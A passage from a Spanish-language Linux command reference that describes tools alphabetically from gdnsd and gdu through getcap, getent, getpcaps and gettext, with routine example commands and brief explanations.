     mail.mi-dominio.com. IN MX 20 mail2.mi-dominio.com.
     mail1.mi-dominio.com. IN A 192.168.4.40
     mail2.mi-dominio.com. IN A 192.168.5.50
Configuramdo un plugin de health checking, como ping o uno que consulte un puerto específico. para monitorizar la disponibilidad de 192.168.4.40. Si el health check falla, gdnsd dejaría de devolver la dirección IP de mail1.mi-dominio.com en las respuestas a las consultas MX, favoreciendo el servidor con menor preferencia [mail2.mi-dominio.com].
3.-
Redirección Basada en Subdominios y Geolocalización
Ejemplo para dirigir a los usuarios de diferentes países a versiones localizadas de un sitio web, por ejemplo, eu.mi-dominio.com para Europa y asia.mi-dominio.com para Asia. definiendo los registros CNAME o A para los subdominios localizados.
     eu.mi-dominio.com. IN A 192.168.6.60  ; Servidor en Europa
     asia.mi-dominio.com. IN A 192.168.7.70  ; Servidor en Asia
     www.mi-dominio.com. IN GDNSD geo-redirect
La configuración de gdnsd para la zona mi-dominio.com le indicaría que para las consultas a www.mi-dominio.com, determine la ubicación del cliente y devuelva un registro CNAME o A al subdominio apropiado (eu.mi-dominio.com o asia.mi-dominio.com).


gdstools
Herramientas de almacenamiento GPUDirect de NVIDIA. El Almacenamiento GPUDirect [GpuDirect Storage - GDS] permite una ruta de datos directa para transferencias de acceso directo a memoria [Direct Memory Access - DMA] entre la memoria de la GPU y el almacenamiento, lo que evita un búfer de rebote en la CPU.
$ /usr/local/cuda-<x>.<y>/gds/tools/gdscheck.py -p (verificar que GPUDirect Storage [GDS] está instalado correctamente)
Nota.- Reemplazar <x> con la versión mayor y <y> con la versión menor del toolkit CUDA instalado en el sistema.
$ dmesg | grep -e DMAR -e IOMMU (verificar el estado actual de IOMMU)
$ modprobe nvidia-peerdirect (después de reiniciar el sistema, es necesario cargar el módulo que admite las capacidades PeerDirect)


gdu
[Go Disk Usage]. Analizador de uso de disco optimizado para discos SSD, donde utiliza procesamiento paralelo para mejorar la velocidad de análisis, aunque también funciona en discos HDD con menor ganancia de rendimiento.
$ gdu (abre la interfaz de consola del directorio actual)
Nota.- Con el modo interactivo pulsando ? muestra todas las teclas útiles. "q" para salir.
$ gdu /var/log (abre le directorio especificado)
$ gdu -d (mostrar todos los discos montados)
$ gdu -n /var/www (muestra el uso de disco sin la interfaz interactiva)
$ gdu -c -i $HOME/.cache,$HOME/.config $HOME (ignorar directorios especificados del /home del usuario y sin colores)
$ gdu -nps $HOME (mostrar solo el tamaño total)
$ gdu --si $HOME (usar escala decimal [SI] en lugar de binaria)
$ gdu -m 4 $HOME (limita gdu a usar solo 4 núcleos, útil para reducir la carga en sistemas con muchos núcleos)
$ gdu -g /home/user (activa la recolección de basura constante, reduciendo el uso de memoria ~30% menos a costa de un análisis ~25% más lento)
$ gdu -l ./gdu_errors.log /home/user (registra errores, por ejemplo, permisos denegados en gdu_errors.log)
$ gdu -a $HOME (muestra el tamaño real de los archivos, sin contar bloques de disco)
$ gdu -I '.*cache.*' /home/user (ignora directorios que coincidan con el patrón .*cache.*, por ejemplo, .cache, cache_data)
Símbolos en la salida de archivos y directorios pueden tener prefijos con significados especiales:
      !: Error al leer el directorio.
      .: Error al leer un subdirectorio.
      @: Archivo es un enlace simbólico o socket.
      H: Enlace duro ya contado.
      e: Directorio vacío.


gearman
[gear man - hombre engranaje]. Es un sistema de cola de tareas que permite distribuir trabajo entre varias máquinas o procesos. Este paquete es un paquete vacío que depende tanto del cliente como del servidor.
$ gearadmin --status (ver estado del servidor)
$ gearman -f función -b < datos (enviar un trabajo)
$ gearman -w -f función -- ./script_procesamiento.sh (ejecutar un trabajador en bash)
$ gearadmin --status (ver trabajos en cola)
$ gearadmin --workers (ver trabajadores conectados)
Nota.- Cliente: Envía trabajos para ser ejecutados, Trabajador: Ejecuta los trabajos y Servidor: Coordina la comunicación entre clientes y trabajadores


gedit
Editor de texto
$ gedit --list-encodings  (Lista la codificación de caracteres)
$ gedit --encoding UTF-8 archivo.txt  (Abre el archivo mencionado con la cofificación especificada)
Atajos
	Ctrl+c (Copiar)
	Ctrl+s (Guarda documento)
	Ctrl+v (Pegar)
	Ctrl+x (Cortar)
	Ctrl+w (Cerrar ventana activa)
	Ctrl+Mayús+flecha  (seleccionar texto a derecha o izquierda)


geekcode
Programa para generar código geek [Geek Code Block]. Este "código" es una especie de firma, para emails, foros, o perfiles, que describe intereses, habilidades y actitudes de una manera muy geek, es decir, muy técnica y compacta.
$ geekcode > mi_geekcode.txt (pregunta de forma interactiva varias cosas sobre el usuario y se guarda en el fichero)
$ geekcode -f mis_respuestas.txt > salida.txt (leer respuestas desde un archivo y no preguntar interactivo y guardarlo en salida.txt)
Ejemplo de código generado:
        -----BEGIN GEEK CODE BLOCK-----
        Version: 3.12
        GIT d- s: a- C+++ UL++ P+ L++ E-- W+ N+ o-- K- w--- O- M- V PS+ PE-- Y PGP- t+ 5+ X R tv b+ DI+ D+ G e++ h-- r+ y+
        ------END GEEK CODE BLOCK------
Ese bloque de letras crípticas es la "identidad geek" comprimida. Para descifrar el significado entrar en la página <http://www.joereiss.net/geek/ungeek.html>


gem
[rubygems]. Nombre que reciben los módulos en ruby.
$ gem install rake (Instalar. "Rake" en este caso)
$ gem install rake --remote (Instalar desde un servidor remoto)
$ gem list --local (Muestra las gemas instaladas)
$ gem list R (Lista las gemas cuyo nombre empieza por "R")
$ gem search rake (Buscar una gema)
$ gem search --both mysql (Busca entre las gemas locales o remotas las que contengan "mysql")
$ gem search --remote mysql (Busca entre las gemas remotas las que contengan "mysql")
$ gem help (Información de todas las gemas)
$ gem help push (Muestra información sobre un comando. "push" en este caso)
$ gem content rake (lo que instalo una gema en el sistema)
$ gem uninstall rake (Desinstalar "rake")
$ gem environment (Información sobre rubygems)
$ gem update (Actualizar todas las gemas del sistema)


gem2deb
[dh-make-ruby devscripts build-essential]. Herramientas para crear paquetes Debian a partir gemas Ruby, distribuido con Rubygems. gem2tgz convierte el archivo .gem en un archivo tar. A continuación, dh-make-ruby crea un paquete fuente Debian a partir de ese archivo. Este paquete Debian utiliza el asistente Debhelper incluido, dh_ruby, para generar un paquete Debian adecuado.
$ gem2tgz nombre_gema.gem (descargar y convertir la gema a .tar.gz)
$ gem2tgz nombre_gema (descargar directamente desde rubygems)
$ dh-make-ruby nombre_gema-version.tar.gz (crear estructura de paquete Debian)
$ gem2tgz nombre_gema -v 1.2.3 (descargar especificar versión específica)
$ gem2tgz nombre_gema --rubygems-url https://rubygems.org/ (usar mirror específico de rubygems)
$ gem2tgz --force nombre_gema (forzar recreación del tarball)
1.-
Proceso completo de ejemplo con la gema "faker"
$ gem2tgz faker (convertir la gema faker a tarball)
$ dh-make-ruby faker-2.1.2.tar.gz (crear estructura Debian, suponiendo que la versión es 2.1.2)
$ cd ruby-faker (entrar al directorio...)
$ dpkg-buildpackage -us -uc (... y construir)
Crea una estructura parecida a
      ruby-nombre-gema/
      ├── debian/
      │   ├── control
      │   ├── rules
      │   ├── changelog
      │   └── ...
      ├── Gemfile
      └── ...


gemsets
Conjunto de gemas que definimos para una determinada versión de Ruby [ver] y que están aislados entre ellos. O sea, si tenemos dos proyectos y cada uno con una versión distinta, no tienen conflicto entre ellos. Por tanto, lo más recomendable es definir un gemset para cada proyecto en el que estemos trabajando. Ver rvm.


gendarme
Herramienta de análisis estático para ensamblados .NET y Mono que detecta problemas comunes en el código mediante reglas configurables. Funciona a nivel de código intermedio [CIL/IL], lo que permite analizar cualquier lenguaje .NET compilado.
$ gendarme --html Reporte.html MiBiblioteca.dll (analiza MiBiblioteca.dll y genera un reporte HTML)


genders
Herramienta útil en la gestión de clústeres Linux, especialmente cuando se necesita aplicar configuraciones o ejecutar comandos de forma selectiva en grupos de nodos con características similares. Es una basa en una base de datos estática que describe las características o atributos de los nodos que componen un clúster.
Ejemplos de nodos
# nano /etc/genders:
       nodo1 cpu=intel,mem=16GB,os=centos7,rol=compute
       nodo2 cpu=amd,mem=32GB,os=ubuntu20,rol=compute
       nodo3 cpu=intel,mem=8GB,os=centos7,rol=storage
       nodo4 cpu=amd,mem=16GB,os=ubuntu20,rol=compute
       nodo5 cpu=intel,mem=32GB,os=centos8,rol=management
$ genders nodo1 (listar las propiedades de un nodo específico)
$ genders -l cpu=intel (listar todos los nodos con una propiedad específica)
$ genders -l cpu=amd,rol=compute (listar los nodos que tienen varias propiedades)
$ genders -L "os=centos7|os=ubuntu20" (listar los nodos que tienen al menos una de las propiedades especificadas)
$ genders -l '!rol=storage' (listar los nodos que no tienen una propiedad específica)
$ genders -l 'cpu=intel,!mem=8GB' (combinar condiciones AND y NOT)


genext2fs
Permite crear una imagen de sistema de archivos ext2 sin necesidad de ser root. No requiere montar el archivo de imagen para copiar archivos.
$ genext2fs -b 4096 ejemplo.img (creará un archivo llamado "ejemplo.img" con un tamaño de bloque de 4096 bytes)
$ genext2fs -b 4096 -n 1000 ejemplo.img (creará un sistema de archivos con 1000 bloques de 4096 bytes cada uno)
$ genext2fs -b 4096 -s 10M ejemplo.img (creará un sistema de archivos de aproximadamente 10 megabytes)
$ genext2fs -b 4096 -i 1000 -d 50 ejemplo.img (creará un sistema de archivos con 1000 inodos y 50 directorios)
Nota.- la herramienta dd para copiar la imagen a un dispositivo real.


genimage
Herramienta muy útil en entornos embebidos [embedded] o sistemas Linux personalizados, donde se necesita generar imágenes de sistemas de archivos o imágenes completas de discos por ejemplo, para flashear en una memoria NAND/NOR, una tarjeta SD, o un dispositivo similar. Toma un directorio raíz [rootfs] que contiene el sistema de archivos del dispositivo y genera una imagen en un formato específico, como ext4, squashfs, ubifs, cpio, etc, o incluso una imagen completa de disco que incluya particiones y cargadores de arranque.
$ genimage --config genimage.cfg --rootpath path/al/rootfs --tmppath tmp/ --outputpath images/ (archivo de configuración que especifica qué imágenes generar y cómo, donde se encuentra el sistema de archivos raíz, carpeta temporal y carpeta donde se almacenarán las imágenes generadas)


genisoimage
Herramienta que permite crear imágenes ISO [formato ISO 9660] de sistemas de archivos, como las que se usan para crear CDs o DVDs arrancables [bootables] o distribuciones de software que posteriormente pueden grabarse en CD o DVD. Incluye las herramientas mkzftree [crea una imagen ISO-9660 con contenido comprimido], dirsplit [separa fácilmente el contenido de directorios grandes en discos de tamaño predefinido] y geteltorito [extrae una imagen de arranque de El Torito desde una imagen de CD].
$ genisoimage -o ejemplo.iso -R -J /home/usuario/cd/ (crea ejemplo.iso del directorio /home/usuario/cd/, -R preserva nombres de archivo largos y permisos y -J soporte Joliet [windows])
$ mkzftree /home/usuario/cd /tmp/cd_comprimido (genera versión comprimida de los archivos de /home/usuario/cd, en /tmp/cd_comprimido, lista para ser usada con genisoimage)
$ dirsplit -d /tmp/split -s 700 /home/usuario/cd/ (divide el contenido del directorio /home/usuario/cd/ en subdirectorios dentro de /tmp/split, donde cada subdirectorio contiene un máximo de 700 MB)
$ geteltorito -o arranque.img debian.iso (extrae la imagen de arranque [boot.img] desde el archivo ISO debian.iso)
1.-
Ejemplo completo de uso combinado:
Crear una ISO arrancable con archivos comprimidos:
$ mkzftree /home/usuario/cd /tmp/zf_cd
$ genisoimage -o final.iso -R -J -z -b boot.img -c boot.cat /tmp/zf_cd (-z que se está usando zisofs [comprimido con mkzftree], -b: archivo de arranque y -c: catálogo de arranque, necesario para bootables)


genius
Calculadora.
$ genius (Entra en el prompt. Su uso en el clásico: 60*2, 100/5... exit para salir)
$ genius –exec=50/2


genromfs
Este es equivalente a mkfs [ver] en sistema de archivos romfs [Read-Only Memory File System] que es un sistema de archivos pequeño y de solo lectura diseñado para sistemas embebidos o medios de rescate. No soporta archivos mayores a 4GB
$ genromfs -f sistema.rom -d mi_directorio (crea una imagen llamada sistema.rom con el contenido de mi_directorio)
$ genromfs -f rescue.rom -d rescue_files -V "Sistema de rescate v1.0" (especificar una etiqueta)
$ genromfs -d mi_directorio > imagen.rom (redirigir la salida a stdout)
$ genromfs -d rootfs -f /dev/flash_drive (con dispositivos de bloque directamente)
$ genromfs -f minimal.rom -d rootfs -x "*.tmp" -x "*.log" (excluir archivos por patrón)


geoiplookup
[geoip-bin geoip-database]. Localiación geográfica de una ip o un host.
$ geoiplookup google.es
$ geoiplookup -i google.es
$ geoiplookup 80.60.233.195


geoipupdate
Actualiza las bases de datos GeoIP2 y GeoIP Legacy para clientes de MaxMind. El programa se conecta al servidor de actualización MaxMind GeoIP para buscar nuevas bases de datos. Si hay una nueva base de datos disponible, el programa la descargará e instalará.
# geoipupdate
Nota.- En el archivo de configuración se ha reemplazar YOUR_ACCOUNT_ID_HERE y YOUR_LICENSE_KEY_HERE por una combinación de clave de licencia e ID de cuenta activa asociada con su cuenta de MaxMind. Estos números están disponibles en https://www.maxmind.com/en/my_license_key y descomentar las lineas:
# nano /etc/GeoIP.conf
  AccountID YOUR_ACCOUNT_ID_HERE
  LicenseKey YOUR_LICENSE_KEY_HERE


geolooc
[weboob (Ver)]. Geolocalizar direcciones ip. Precisa módulo ipinfodb activado (ver weboob)
$ geolooc 8.8.8.8
	id: 8.8.8.8@ipinfodb
	city: MOUNTAIN VIEW
	region: CALIFORNIA
	zipcode: NA
	country: US
	lt: 37.405992
	lg: -122.078515
	host: google-public-dns-a.google.com
	tld: com


geotiff-bin
Herramientas para manipular archivos GeoTIFF, que son archivos TIFF con información geográfica incrustada, por ejemplo, sistema de coordenadas, resolución espacial, etc. La biblioteca GeoTIFF incluye dos utilidades: listgeo [extrae y muestra la metainformación geográfica, etiquetas GeoTIFF, de un archivo TIFF] y geotifcp [Inserta o reemplaza metadatos geográficos en un archivo TIFF a partir de un archivo .geo generado por listgeo].
$ listgeo mapa.tif > mapa.geo (guardar metadatos a un archivo)
$ geotifcp -g metadatos.geo original.tif nuevo_geotiff.tif


germinate
Herramienta utilizada para gestionar listas de paquetes denominadas semillas [seeds]. Su función principal es tomar estas listas iniciales de paquetes y expandirlas, resolviendo todas sus dependencias para generar una lista completa de paquetes necesarios.
$ germinate --seed-path ./seeds/ --output-dir ./output/ desktop (el resultado da lista de todos los paquetes necesarios para la semilla desktop, incluyendo dependencias directas e indirectas)
      --seed-path ./seeds/: Ruta al directorio donde están los archivos de semillas.
      --output-dir ./output/: Directorio donde se guardará la lista expandida de paquetes.
      desktop: Nombre de la semilla a procesar.
$ germinate --seed-path ./seeds/ --output-dir ./output/ alternate (permite rastrear el origen y la razón de inclusión de cada paquete en la compilación final)
$ grep -l ^exim4 ./output/* (ver por qué exim4 aparece en la lista final de paquetes para un CD de instalación)


gertty
Gerrit es una herramienta de revisión de código basada en web muy usada en entornos de desarrollo colaborativos que usan Git. A diferencia de Gerrit, que es web, Gertty permite gestionar revisiones de código de manera local y offline por lo que las acciones como comentar, aprobar o marcar como revisado se aplican en local y se sincronizan más tarde.
Crear un archivo de configuración. Ejemplo mínimo:
$ nano ~/.gertty.yaml
       gerrit:
         url: https://review.example.com
         username: tu_usuario
         password: tu_token_o_password
       projects:
         - name: ejemplo/proyecto
           git-url: ssh://tu_usuario@review.example.com:29418/ejemplo/proyecto
Nota: Gerrit puede requerir una contraseña o HTTP password/token, no tu clave normal.
$ gertty (cuando se lanza gertty por primera vez, sincronizará los proyectos y cambios locales)
1.-
Ejemplo de flujo de trabajo
$ gertty (abrir Gertty)
Aparecen cambios nuevos para revisar:
         Project: ejemplo/proyecto
           * Change 1234: Corrige error en módulo X
           * Change 1235: Mejora documentación
Navegas a uno con j/k, presionas Enter para abrirlo, lees el diff, haces comentarios (r), votas con v (por ejemplo, Code-Review +1), marcas como revisado con c y sincronizas con el servidor con :sync.


ges1.0-tools
[GStreamer Editing Services]. Herramientas para usar con los servicios de edición de GStreamer.
$ ges-launch-1.0 +clip ~/Música/the_best.wav
$ ges-launch-1.0 +clip video.mp4 (crea una timeline con una sola capa y un solo clip de video llamado video.mp4)
$ ges-launch-1.0 +clip video1.mp4 +clip video2.mp4 (concatena los dos clips en una sola línea de tiempo)
$ ges-launch-1.0 +clip video.mp4 ! videobalance brightness=0.5 (añade un efecto de brillo al video. Se puede usar cualquier plugin de GStreamer como efecto)
$ ges-launch-1.0 +clip video.mp4 +clip audio.mp3 (crea una línea de tiempo donde se reproduce video.mp4 con la pista de audio adicional audio.mp3)
$ ges-launch-1.0 +clip video.mp4 inpoint=5 duration=10 (usa el video video.mp4 desde el segundo 5 durante 10 segundos)
$ ges-launch-1.0 --help-gst (mostrar las opciones de GStreamer)
$ ges-launch-1.0 --help-rendering (mostrar opciones de renderizado)
$ ges-launch-1.0 --help-playback (mostrar opciones de reproducción)
$ ges-launch-1.0 --help-informative (mostrar opciones informativas)
$ ges-launch-1.0 --track-types=audio +clip ~/Videos/un_video.avi  (en una muestra de audio y vídeo, solo reproducirá el audio de la muestra en su totalidad)


gesftpserver
[Green End SFTP]. Submódulo de servidor SFTP para OpenSSH. Su propósito principal es permitir la transferencia segura de archivos usando el protocolo SFTP [SSH File Transfer Protocol]. SFTP es un protocolo de red, que suele ejecutarse como un subsistema SSH y que permite la transferencia de archivos.
Cambiar la configuración de SSH:
# nano /etc/ssh/sshd_config
Busca la línea que dice:
      Subsystem sftp /usr/lib/openssh/sftp-server
Y cámbiala por:
      Subsystem sftp /usr/lib/gesftpserver/gesftpserver
# systemctl restart ssh (reiniciar el servicio SSH para aplicar cambios)
$ sftp usuario@servidor (conectarse usando un cliente SFTP)
Una vez conectado, se puede usar comandos como:
      put archivo.txt (subir archivo)
      get archivo.txt (descargar archivo)
      ls (listar archivos)


get-iab
[arp-scan]. Recupera el archivo IAB de Ethernet del sitio web IEEE [<https://standards.ieee.org/>] y lo guarda en el formato utilizado por arp-scan. El archivo IAB contiene todos los IAB (bloques de direcciones individuales) que se han registrado con IEEE.
# get-iab -v
# get-iab -f iab.txt (que escriba el resultado en el archivo especificado. Por defecto en ieee-iab.txt)


get-oui
[arp-scan]. Recupera el archivo OUI de Ethernet del sitio web IEEE [<http://standards.ieee.org>] y lo guarda en el formato utilizado por arp-scan. El archivo OUI contiene todos los OUI (identificadores únicos de la organización) que se han registrado con IEEE.
# get-oui -v
# get-oui -f oui.txt (que escriba el resultado en el archivo especificado. Por defecto en ieee-oui.txt)


getcap
Buscar archivos con capabilities y que son  las funcionalidades que pueden asignarse a un ejecutable y que muchas veces pueden otorgar permisos demasiado altos durante la ejecución de dicho programa. Con "man capabilities" obtendremos un listado de las capabilities implementadas y las operaciones o comportamientos que permite cada una. [entrada relacionada con setcap]
$ getcap -r / 2>/dev/null (de forma recursiva)
$ getcap -v  /usr/bin/ping (permite mostrar las capabilitys otorgadas)


getconf
Consulta las variables de configuración del sistema.
$ getconf -a (Muestra el listado)
$ getconf LONG_BIT (Informa sobre si se trata de un equipo de 32 o 64 bits)


getdata
Herramienta diseñada para gestionar bases de datos externas, facilitando la descarga de datos mediante wget y su posterior indexación. Es útil para mantener bases de datos actualizadas automáticamente, como las de programas como iplocate, tellico o gnotski.
# getdata ejemplo (con un archivo de configuración [/etc/getdata/ejemplo.conf], que define la fuente de datos y cómo indexarlos, leerá la configuración y descargará los datos)
# getdata --debug --force ejemplo (volver a descargar los datos y ver más detalles)
# getdata --show ejemplo (revisar cómo está configurada una base de datos)
Una muestra de archivo de configuración
# nano /etc/getdata/ejemplo.conf
       # Fuente de datos a descargar
       URL = "https://ejemplo.com/database/latest.zip"
       # Comando para extraer/indexar los datos
       POST_PROCESS = "unzip -o %f -d /var/lib/ejemplo/db/"
       # Ruta donde guardar los datos descargados
       OUTPUT_FILE = "/var/lib/ejemplo/db/latest.zip"


getdns-utils
Es una API para consultas DNS asíncrona [que las aplicaciones no se bloqueen esperando la respuesta DNS] moderna. Incluye la utilidad de línea de comandos getdns-query, que permite realizar consultas DNS detalladas y analizar las respuestas, incluyendo soporte para UDP, TCP y TLS, así como para la validación de seguridad DNSSEC
$ getdns_query www.ejemplo.com (realiza una consulta DNS estándar para obtener la dirección IPv4 del dominio indicado)
$ getdns_query -t AAAA www.ejemplo.com (el parámetro -t AAAA especifica que se desea consultar el registro IPv6)
$ getdns_query -l www.ejemplo.com (-l fuerza el uso de DNS sobre TLS, proporcionando mayor privacidad y seguridad en la consulta)
$ getdns_query -s www.ejemplo.com (-s activa la validación DNSSEC, mostrando si la respuesta está firmada y es segura)
$ getdns_query -t MX dominio.com (consulta los registros de correo [MX] del dominio)


getenforce
Comprobar el estado de selinux.
# getenforce
Estados posibles
enforcing [impositivo] (Política de seguridad activa)
permissive [permisivo] (Registra los eventos pero no impone la política)
disabled [inhabilitado] (Desactivado)
# nano /etc/selinux/config
	# This file controls the state of SELinux on the system.
	# SELINUX= can take one of these three values:
	# enforcing - SELinux security policy is enforced.
	# permissive - SELinux prints warnings instead of enforcing.
	# disabled - No SELinux policy is loaded.
	SELINUX=permissive
	# SELINUXTYPE= can take one of these two values:
	# default - equivalent to the old strict and targeted policies
	# mls     - Multi-Level Security (for military and educational use)
	# src     - Custom policy built from source
	SELINUXTYPE=default
	# SETLOCALDEFS= Check local definition changes
	SETLOCALDEFS=0


getent
Obtiene entradas de la base de datos administrativa (ahosts, passwd, group, hosts, services, protocols, networks, aliases y rpc)
$ getent passwd (lista los usuarios creados en el sistema)
$ getend group users (Ver los usuarios del grupo users)
$ getent services 22 (Muestra el servicio que corre por el puerto especificado. Si no se especifica puerto los lista todos)


getfacl
Muestra la lista de control de acceso de archivos o directorios.
$ getfacl /var/www (Muestra propietario, grupo y permisos)
$ getfacl -c /var/www (Sólo muestra los permisos)
$ getfacl -R /var/www (De forma recursiva en todos los archivos y subdirectorios)


gethostip
[syslinux-utils]. Convierte una dirección IP a varios formatos.
$ gethostip -d google.es (muestra la ip del host)
$ gethostip google.es (muestra nombre de host, la IP en formayo decimal y con formato hexadecimal)
$ gethostip -x google.es (sólo con formato hexadecimal)
$ gethostip -f google.es (Genera la dirección IP en todos los formatos admitidos)


getkeycodes
Muestras las tablas de asignación scancode y keycode del núcleo.
$ getkeycodes


getopt
se utiliza para analizar las opciones en líneas de comando para facilitar su análisis por parte de los procedimientos del shell y para comprobar si las opciones son válidas. Por ejemplo, si tiene un script que acepta las opciones -a, -b y -c, getopts permite combinarlas como -abc, -bca o -bac, etc.


getpcaps
Muestra las capacidades en los procesos indicados por el valor pid indicado. Un pid  0 muestra las capacidades del propio proceso que está ejecutando getpcaps.
$ getpcaps --verbose 1247 (del PID mencionado)
Otra forma de ver las capacidades de un proceso:
$  cat /proc/1247/status | grep Cap
$ capsh --decode=00000000a80425fb (para decodificar el número hexadecimal de la salida anterior en CapInh)
Nota.- Cada cláusula consta de una lista de nombres de capacidades separados por comas o la palabra "all" [especifica todas las capacidades], seguida de una lista de acciones. Una lista de acciones consta de una secuencia de pares de indicadores de operador. Los operadores legales son: `=', '+' y `-'. Los flags son: 'e', 'i' y 'p' [Effective, Inheritable y Permitted , Efectivo, Heredable y Permitido ]. all=p" significa reducir todas las capacidades en los conjuntos Effective y Inheritable pero aumentar todas las capacidades Permitted; o "cap_fowner=ep" significa aumentar la capacidad de anulación de propiedad de archivos Effective y Permitted mientras se reduce la capacidad Inheritable. Podemos profundizar en cada capacidad para comprender su significado y función:
     cap_chown: permite que el proceso cambie la propiedad de los archivos
     cap_dac_override: permite que el proceso omita los controles de acceso discrecionales [DAC], lo que le permite acceder a archivos incluso si las comprobaciones de permisos estándar denegarían el acceso.
     cap_audit_write: permite que el proceso escriba registros de auditoría para monitorear y rastrear la actividad del sistema
     cap_setfcap: permite que el proceso establezca capacidades de archivos, que son controles de acceso adicionales más allá de los permisos tradicionales.
     +i – : significa las capacidades heredables que se pueden pasar a procesos secundarios
En el caso de que el operador principal sea '=' o "all=" y no se proporcione una lista de capacidades, se supone que la lista de acciones se refiere a 'todas' las capacidades.



getsebool
Permite listar polí­ticas y determinar si estan activas o inactivas en SELinux, implementación de seguridad para GNU/Linux que provee una variedad de políticas de seguridad a través del uso de módulos de Seguridad en el nucleo de Linux. Ver setsebool
# getsebool -a (Lista todas las políticas, activa o inactivas)
# getsebool -a | grep ftp (conocer que polí­ticas que incluyan la cadena ftp están activas)
	Para el servicio de FTP las políticas serían:
	    allow_ftpd_anon_write (Permite a usuarios anónimos escribir en el servidor)
	    allow_ftpd_full_access (Permite lectura y escritura sobre los archivos del servidor)
	    allow_ftpd_use_cifs (Permite transferencias de datos desde CIFS)
	    allow_ftpd_use_nfs (Permite transferencias de datos desde NFS)
	    ftp_home_dir (Permite a usuarios locales acceder a sus directorios de inicio)


getstream
Utilidad que extrae un flujo de transporte MPEG de una tarjeta DVB conectada al sistema y configurada correctamente y lo transmite a la red de área local. Está diseñada para reemplazar a VLC y consume mucha menos CPU y memoria que VLC.
$ getstream (iniciará el extracción del flujo de transporte MPEG y lo transmitirá a la red local)
$ getstream --pid=PID --sid=SID --tsfile=/home/user/dvb_stream.ts (identificador del PID del flujo que se desea capturar, identificador del SID del servicio DVB y ruta donde se guardará)


gettext
Utilidades para la internacionalización [i18n] y la localización [l10n] de software. Permiten que los programas que hace el uuario se muestren en diferentes idiomas sin necesidad de modificar el código fuente principal. En el flujo de trabajo de gettext, los textos que se mostrarán al usuario en el programa no están directamente escritos en el código. En su lugar, se utilizan cadenas especiales que actúan como "claves". Estas claves se asocian a las traducciones correspondientes en archivos separados para cada idioma.
Ejemplo de uso en lenguaje Python para marcar cadenas traducibles
# nano script.py
       import gettext
       # Establecer el directorio donde se encontrarán los archivos .mo
       LOCALEDIR = 'locale'
       # Obtener la función de traducción para el dominio 'mi_programa' y el idioma actual
       gettext.install('mi_programa', LOCALEDIR)
       print(_("Hola, mundo!"))
       nombre = "Usuario"
       print(_("Bienvenido, %s") % nombre)
       print(_("Tienes %(count)d mensaje(s) nuevo(s).") % {'count': 3})
En este ejemplo:
       Importamos el módulo gettext.
       Definimos LOCALEDIR como el directorio donde guardaremos nuestros archivos .mo.
       gettext.install('mi_programa', LOCALEDIR) configura el entorno de traducción para el dominio 'mi_programa'. El "dominio" agrupa los archivos de traducción relacionados con una parte del software.
       La función _() (que es un alias común para gettext.gettext()) envuelve las cadenas que queremos traducir.
$ xgettext --default-domain=mi_programa -o locale/mi_programa.pot script.py (especifica el nombre del dominio para el archivo .pot, la ruta y el nombre del archivo de salida .pot y el script que se analiza)


getty
[get tty] es el original de UNIX responsable de iniciar sesiones de login en terminales. Reemplazado por agetty [ver].


getty-run
[GET TeletYpe]. Scripts auxiliares que proporciona una forma sencilla de gestionar y supervisar procesos getty. Proporciona archivos de servicio compatibles con daemontools o runit [alternativas a systemd].
Cuando se instala getty-run, se suelen crear archivos en los directorios /etc/sv/getty-XXXX/ [/etc/sv/getty-tty6/, /etc/sv/getty-ttyv0/, /etc/sv/getty-hvc0...] como /etc/sv/getty-tty1/run o /etc/sv/getty-tty6/finish.
1.-
Si quieremos ejecutar un getty en /dev/tty1 usando runit:
# ln -s /etc/sv/tty1 /etc/service/ (hace que runit supervise getty en /dev/tty1. A partir de aquí, si el proceso getty muere, runit lo reiniciará automáticamente)
$ ps aux | grep getty (verificar que esté funcionando)
2.-
Supervisar un tty serial en /dev/ttyS0
# cp -r /etc/sv/tty1 /etc/sv/ttyS0 (copiar un servicio existente)
# nano /etc/sv/ttyS0/run (edita el archivo y cambiar tty1 por ttyS0)
       #!/bin/sh
       exec getty -L 9600 ttyS0 vt100
# ln -s /etc/sv/ttyS0 /etc/service/ (enlazar el servicio)


gfarm2fs
Programa basado en FUSE [Filesystem in Userspace] que permite montar un sistema de archivos Gfarm en un punto de montaje local y acceder a su sistema de archivos. El sistema de archivos Gfarm está diseñado para convertir PCs de consumo en nodos de una red de almacenamiento distribuido, implementando la arquitectura Grid Datafarm para computación global con uso intensivo de datos a gran escala.
$ gfarm2fs /mnt/gfarm (montar un sistema de archivos Gfarm)
$ fusermount -u /mnt/gfarm (desmontar un sistema Gfarm)
$ gfarm2fs -o attr_timeout=15 /mnt/gfarm (establece tiempo de caché para los atributos de archivo a 15 segundos)
$ gfarm2fs -o allow_other,default_permissions /mnt/gfarm (permite que otros usuarios accedan al sistema montado manteniendo los permisos)
$ gfarm2fs -o directory=/usuario/datos /mnt/gfarm (montar un directorio específico)
$ gfarm2fs -o attr_timeout=30,entry_timeout=30,negative_timeout=5 /mnt/gfarm (tiempo de caché 30 segundos, caché para entradas de directorio(30 segundos y tiempo de caché para entradas no existentes 5 segundos)
$ gfarm2fs -o gfs_stat_timeout=5,auto_cache /mnt/gfarm (tiempo de caché para información de estado y habilita el almacenamiento en caché automático)
Para configurar un montaje automático al iniciar el sistema:
# nano /etc/fstab
Agregar la entrada:
        gfarm2fs#/    /mnt/gfarm    fuse    noauto,user    0    0


gfarm-client
El sistema de archivos Gfarm está diseñado para convertir PCs estándar en nodos de una red de almacenamiento distribuido, implementando la arquitectura Grid Datafarm para computación global con uso intensivo de datos a gran escala.
$ gfservice start-gfmd gfmd2 (inicia servidor metadatos [gfmd] en host gfmd2)
$ gfservice stop-gfarm gfmd1 (detiene gfmd y su base de datos)
$ gfservice promote gfmd2 (si gfmd1 falla promueve gfmd2 de esclavo a maestro)
$ gfservice config-gfarm-slave gfmd2 gfmd1 (configura gfmd2 como esclavo de gfmd1)
$ gfservice set-gfmd-conf gfmd1 metadb_server_list "gfmd1,gfmd2" (modificar parámetros de configuración en tiempo real)
$ gfservice mount client1 /mnt/gfarm -o allow_other (montar sistemas de archivos Gfarm remotamente)
$ gfservice config-client client1  # Copia claves de gfmd1 al cliente (configurar autenticación compartida)
$ gfservice config-gfarm-master gfmd1 (configura nodo maestro)
$ gfservice config-gfarm-slave gfmd2 gfmd1 (añade esclavo replicando de gfmd1)
$ gfservice restart-all (reinicia toda la infraestructura)
$ gfgroup -l usuarios_ciencia (administrar grupos del sistema)
$ gfkey -c -b 2048 (gestionar claves de autenticación)
$ gfarm2fs /mnt/gfarm (montar Gfarm como sistema de archivos)


gff2ps
